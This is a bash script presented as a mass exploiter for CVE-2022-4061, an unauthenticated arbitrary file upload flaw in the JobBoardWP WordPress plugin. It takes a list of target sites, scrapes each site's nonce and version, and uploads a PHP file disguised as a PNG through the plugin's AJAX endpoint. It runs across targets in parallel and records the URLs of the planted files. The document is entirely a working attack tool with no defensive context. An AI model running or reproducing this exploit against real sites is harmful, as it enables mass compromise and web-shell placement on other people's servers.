#!/bin/bash
# CVE-2022-4061 - JobBoardWP < 1.2.2 - Unauthenticated Arbitrary File Upload
# Created By Im-Hanzou
# Using GNU Parallel
# Usage: bash jbwper.sh list.txt thread

yellow='\033[1;33m'
classic='\033[0m'
cyan='\033[1;36m'

banner=$(cat << "EOF"
___________________       _________             
______  /__  __ )_ |     / /__  __ \____________
___ _  /__  __  |_ | /| / /__  /_/ /  _ \_  ___/
/ /_/ / _  /_/ /__ |/ |/ / _  ____//  __/  /    
\____/  /_____/ ____/|__/  /_/     \___//_/     
                                                
EOF
)

printf "${cyan}$banner${classic}\n"
printf "       ${yellow}CVE-2022-4061 Mass Exploiter${classic}\n\n"
printf "          Created By ${yellow}Im-Hanzou${classic}\n"
printf "          Github: ${yellow}im-hanzou${classic}\n\n"

touch vuln.txt notvuln.txt

exploit() {
  red='\033[1;31m'
  green='\033[1;32m'
  classic='\033[0m'
  target=$1
  thread=$2
  vuln="1.2.1"

  if [[ ! $target =~ ^https?:// ]]; then
      target="https://$target"
  fi

  nonce=$(curl -s -k $target | grep -oP 'var jb_front_data = \K\{[^}]+}' | grep -oP '"nonce":"\K[^"]+')
  version=$(curl -s --connect-timeout 10 --max-time 10 --insecure $target | grep -oP "job\.min\.css\?ver=\K[^']+")

  if [ -n "$version" ]; then
      if [[ $version == $vuln || $version < $vuln ]]; then
          if [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-admin/admin-ajax.php?action=jb-upload-company-logo" -H 'Cookie: jb-logo-upload=tifa.php' -F "nonce=$nonce" -F 'chunks=1' -F 'file=@tifa.png') =~ 'tifa.php' ]]; then
              printf "${green}[ Vuln! Uploaded ]${classic} => [ $target ]\n";
              echo "$target/wp-content/uploads/jobboardwp/temp/tifa.php" >> vuln.txt
          else
              printf "${red}[ Not Uploaded ]${classic} => $target\n";
          fi
      else
          printf "${red}[ Not Vuln ! ]${classic} => $target\n";t
          echo "$target" >> notvuln.txt
      fi
  else
      printf "${red}[ Not JobBoard! ]${classic} => $target\n";
      echo "$target" >> notvuln.txt
  fi
}


export -f exploit
parallel -j $2 exploit :::: $1

total=$(cat vuln.txt | wc -l)
totalb=$(cat notvuln.txt | wc -l)
printf "${yellow}Total Vuln : $total\n"
printf "Total Not Vuln : $totalb${classic}\n"
